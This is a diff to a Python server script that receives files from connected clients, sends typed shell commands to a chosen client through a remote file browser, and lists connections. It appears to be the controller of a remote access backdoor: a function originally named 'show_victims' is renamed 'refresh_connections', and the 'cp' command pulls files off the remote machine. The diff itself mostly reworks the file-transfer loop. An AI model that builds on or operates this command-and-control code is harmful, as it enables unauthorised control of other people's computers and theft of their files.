@@ -29,27 +29,25 @@ def file_transfer(client):
     name = uuid.uuid4().hex
     f = open("received/" + name, 'wb')
 
-    client[0].settimeout(0.5)
-
     while True:
-        try:
-            l = client[0].recv(4096)
-            if l:
-                f.write(l)
-            else:
+        l = client[0].recv(4096)
+        while (l):
+            if l.endswith(bytes("EOFX", "UTF-8")):
+                u = l[:-4]
+                f.write(u)
                 break
-        except socket.timeout:
-            break
-
+            else:
+                f.write(l)
+                l = client[0].recv(4096)
+        break
     f.close()
-    client[0].settimeout(None)
 
 
 def file_browser(client):
 
     client[0].send(bytes("1", "UTF-8"))
-    path = client[0].recv(4096).decode("UTF-8")
-    print(path)
+    client_pwd = client[0].recv(4096).decode("UTF-8")
+    print(client_pwd)
     exit = False
     while not exit:
         command = input("Type a command: ")
@@ -61,14 +59,14 @@ def file_browser(client):
             os.system("clear")
         else:
             client[0].send(bytes(command, "UTF-8"))
-            aux = command.split(" ")
+            aux = command.split("~")
             if aux[0] == "cp":
                 file_transfer(client)
             recibi = client[0].recv(4096).decode("UTF-8")
             print(recibi)
 
 
-def show_victims(locking, connections):
+def refresh_connections(locking, connections):
 
     index = 0
     with locking:
@@ -92,7 +90,7 @@ def main():
 
         if option == "1":
             os.system('clear')
-            show_victims(locking, connections)
+            refresh_connections(locking, connections)
 
         elif option == "2":
             client_id = input("Choose server: ")
